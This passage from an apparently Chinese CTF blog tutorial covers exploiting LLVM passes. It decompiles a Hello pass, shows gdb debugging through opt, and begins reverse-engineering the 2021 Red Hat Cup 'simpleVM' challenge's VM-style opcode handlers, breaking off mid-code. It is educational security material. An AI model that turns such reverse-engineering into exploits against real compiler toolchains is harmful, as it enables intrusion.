!&#123;<span class="title">!1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!0</span> <span class="operator">=</span> !&#123;<span class="type">i32</span> <span class="number">1</span><span class="punctuation">,</span> !<span class="string">&quot;wchar_size&quot;</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="number">4</span>&#125;</span><br><span class="line"><span class="title">!1</span> <span class="operator">=</span> !&#123;!<span class="string">&quot;clang version 6.0.0-1ubuntu2 (tags/RELEASE_600/final)&quot;</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行一下，LLVM PASS就会遍历IR并输出每个函数的函数名称<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ayoung@ubuntu:~/pwn/llvm/eg$ opt -load ./LLVMHello.so -hello ./main.ll</span><br><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line">Hello: a</span><br><span class="line">Hello: b</span><br><span class="line">Hello: c</span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure></p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">GLOBAL__sub_I_Hello_cpp</span><span class="params">(llvm::PassRegistry *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 PassRegistry; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v3[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  __m128i v4; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  X = <span class="string">&quot;Hello World Pass&quot;</span>;</span><br><span class="line">  qword_3088 = <span class="number">16LL</span>;</span><br><span class="line">  qword_3090 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">  qword_3098 = <span class="number">5LL</span>;</span><br><span class="line">  qword_30A0 = &amp;`anonymous namespace<span class="number">&#x27;</span>::Hello::ID;</span><br><span class="line">  word_30A8 = <span class="number">0</span>;</span><br><span class="line">  byte_30AA = <span class="number">0</span>;</span><br><span class="line">  xmmword_30B0 = <span class="number">0LL</span>;</span><br><span class="line">  qword_30C0 = <span class="number">0LL</span>;</span><br><span class="line">  qword_30C8 = llvm::callDefaultCtor&lt;`anonymous namespace<span class="number">&#x27;</span>::Hello&gt;;</span><br><span class="line">  PassRegistry = llvm::PassRegistry::getPassRegistry(a1);</span><br><span class="line">  llvm::PassRegistry::registerPass(PassRegistry, &amp;X, <span class="number">0LL</span>);</span><br><span class="line">  __cxa_atexit(llvm::PassInfo::~PassInfo, &amp;X, &amp;_dso_handle);</span><br><span class="line">  v4 = _mm_unpacklo_epi64(</span><br><span class="line">         <span class="built_in">std</span>::_Function_base::_Base_manager&lt;$_0&gt;::_M_manager,</span><br><span class="line">         <span class="built_in">std</span>::_Function_handler&lt;<span class="type">void</span> ()(llvm::PassManagerBuilder <span class="type">const</span>&amp;,llvm::legacy::PassManagerBase &amp;),$_0&gt;::_M_invoke);</span><br><span class="line">  result = llvm::PassManagerBuilder::addGlobalExtension(<span class="number">0LL</span>, v3);</span><br><span class="line">  <span class="keyword">if</span> ( v4.m128i_i64[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> (v4.m128i_i64[<span class="number">0</span>])(v3, v3, <span class="number">3LL</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>双击<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm::callDefaultCtor&lt;`anonymous namespace<span class="number">&#x27;</span>::Hello&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 llvm::callDefaultCtor&lt;`anonymous namespace<span class="number">&#x27;</span>::Hello&gt;()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = operator new(<span class="number">0x20</span>uLL);</span><br><span class="line">  *(result + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(result + <span class="number">16</span>) = &amp;`anonymous namespace<span class="number">&#x27;</span>::Hello::ID;</span><br><span class="line">  *(result + <span class="number">24</span>) = <span class="number">3</span>;</span><br><span class="line">  *result = off_2D38;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再双击最下方的指针<code>off_2D38</code>即可看到虚表位置。其中最下方的指针<code>runOnFunction</code>就是LLVM PASS中重写的<code>runOnFunction</code>方法。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D38 off_2D38        dq offset _ZN4llvm4PassD2Ev</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D38                                         ; DATA XREF: llvm::callDefaultCtor&lt;`anonymous namespace<span class="number">&#x27;</span>::Hello&gt;(<span class="type">void</span>)+<span class="number">25</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D38                                         ; <span class="built_in">std</span>::_Function_handler&lt;<span class="type">void</span> ()(llvm::PassManagerBuilder <span class="type">const</span>&amp;,llvm::legacy::PassManagerBase &amp;),$_0&gt;::_M_invoke(<span class="built_in">std</span>::_Any_data <span class="type">const</span>&amp;,llvm::PassManagerBuilder <span class="type">const</span>&amp;,llvm::legacy::PassManagerBase &amp;)+<span class="number">32</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D38                                         ; llvm::Pass::~Pass()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D40                 dq offset _ZN12_GLOBAL__N_15HelloD0Ev ; `anonymous namespace<span class="number">&#x27;</span>::Hello::~Hello()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D48                 dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D50                 dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D58                 dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D60                 dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module <span class="type">const</span>*)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D68                 dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt; <span class="type">const</span>&amp;)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D70                 dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D78                 dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D80                 dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D88                 dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D90                 dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>D98                 dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(<span class="type">void</span> <span class="type">const</span>*)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>DA0                 dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>DA8                 dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>DB0                 dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>DB8                 dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>DC0                 dq offset _ZN12_GLOBAL__N_15Hello13runOnFunctionERN4llvm8FunctionE ; `anonymous namespace<span class="number">&#x27;</span>::Hello::runOnFunction(llvm::Function &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002</span>DC0 _data_rel_ro    ends</span><br></pre></td></tr></table></figure>
<p>点进来即可看到重写方法的内容<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::Hello::runOnFunction(llvm *a1, llvm::Value *a2)</span><br><span class="line">&#123;</span><br><span class="line">  llvm *v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 Name; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  llvm::raw_ostream *v7; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  v2 = llvm::errs(a1);</span><br><span class="line">  v3 = *(v2 + <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (*(v2 + <span class="number">2</span>) - v3) &gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(v3 + <span class="number">6</span>) = <span class="number">32</span>;</span><br><span class="line">    *(v3 + <span class="number">4</span>) = <span class="number">14959</span>;</span><br><span class="line">    *v3 = <span class="number">1819043144</span>;</span><br><span class="line">    *(v2 + <span class="number">3</span>) += <span class="number">7LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    a1 = v2;</span><br><span class="line">    llvm::raw_ostream::write(v2, <span class="string">&quot;Hello: &quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = llvm::errs(a1);</span><br><span class="line">  Name = llvm::Value::getName(a2);</span><br><span class="line">  v7 = llvm::raw_ostream::write_escaped(v4, Name, v6, <span class="number">0LL</span>);</span><br><span class="line">  v8 = *(v7 + <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= *(v7 + <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    llvm::raw_ostream::write(v7, <span class="number">0xA</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(v7 + <span class="number">3</span>) = v8 + <span class="number">1</span>;</span><br><span class="line">    *v8 = <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>官方文档中也介绍了如何使用gdb进行动态调试</p>
<p>首先在opt进程上启动gdb</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb opt</span><br></pre></td></tr></table></figure>
<p>opt有很多调试信息，加载需要时间。因为我们还不能在我们的pass中设置断点（共享object直到运行时才加载），所以我们必须执行程序，并让他在调用pass之前、加载共享object之后停下来。最简单的方法是在<code>PassManager::run</code>设置一个断点并配合想要的参数运行程序。下面参数中<code>-hello</code>对应加载的pass文件里注册类时的第一个参数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Reading symbols from opt...(no debugging symbols found)...done.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b PassManager::run</span></span><br><span class="line">Breakpoint 1 at 0x9be40</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> args -load ./LLVMHello.so -hello ./main.ll</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">show args</span></span><br><span class="line">Argument list to give program being debugged when it is started is &quot;-load ./LLVMHello.so -hello ./main.ll&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一旦opt在<code>PassManager::run</code>方法中停止，就能够自由地在pass中设置断点从而完成调试了</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2021红帽杯-simpleVM"><a href="#2021红帽杯-simpleVM" class="headerlink" title="2021红帽杯 simpleVM"></a>2021红帽杯 simpleVM</h2><p>先找<code>runOnFunction</code>，一般都是通过重写这个函数来进行一些自定义的操作，由于LLVM PASS编译出的结构都比较相似，可以通过查找最后找到虚表，最下方的就是<code>runOnFunction</code>。</p>
<p>可以看到是在遍历函数名称（llvm::Value::getName），如果函数名是<code>o0o0o0o0</code>则进入<code>sub_6AC0</code>进一步操作</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>llvm::Function::begin</code>，<code>llvm::Function::end</code>顾名思义，就是获取一个BasicBlock的开头和结尾，进行遍历操作，遍历IR中的<code>o0o0o0o0</code>函数的BasicBlock基本代码块，然后送进<code>sub_6B80</code>处理进一步处理。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, v3);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_6B80</code>这个函数会遍历基本代码块中的指令，并匹配相应的操作，也就是类似vm能够实现各种指令。</p>
<p>开头是个循环，截取一部分。其中<code>llvm::Instruction::getOpcode</code>返回指令类型，需要是55才会进入后续逻辑。这里指令对应的值定义在<code>/include/llvm/IR/Instruction.def</code>，55对应call</p>
<p>所以这里定义了<code>pop</code>，<code>push</code>，<code>store</code>，<code>load</code>，<code>add</code>，<code>min</code>这几个函数名对应的操作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::begin(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::end(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::operator!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( llvm::Instruction::getOpcode(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">        Name = llvm::Value::getName(CalledFunction);</span><br><span class="line">        *s1 = *Name;</span><br><span class="line">        *(s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *(s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *(s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">        ...</span><br><span class="line">     &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE_OTHER_INST(<span class="number">55</span>, Call   , CallInst   )  <span class="comment">// Call a function</span></span><br></pre></td></tr></table></figure>
<p>其中比较重要的有<code>add</code><br><code>llvm::CallBase::getNumOperands</code>，返回funcletpad参数的数量，是返回一条指令中变量的个数，实际上返回的值是函数参数的个数+1<br><code>llvm::CallBase::getArgOperand</code>，第二个参数指明取出第几个操作数<br><code>llvm::ConstantInt::getZExtValue</code>，get Zero extend value，返回0扩展值</p>
<p>这里<code>reg1_0</code>和<code>reg2_0</code>是两个全局变量，可以理解为两个寄存器，当第一个操作数是1时将reg1_0的地址赋给reg，如果第一个操作数是2就把reg2_0的地址赋给reg；然后以reg为地址取值，加等于第二个操作数的值<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">          reg = <span class="number">0LL</span>;</span><br><span class="line">          v15 = llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">          <span class="keyword">if</span> ( v15 )</span><br><span class="line">          &#123;</span><br><span class="line">            v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">              reg = reg1_0;</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">              reg = reg2_0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( reg )</span><br><span class="line">          &#123;</span><br><span class="line">            v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v12 = llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">            <span 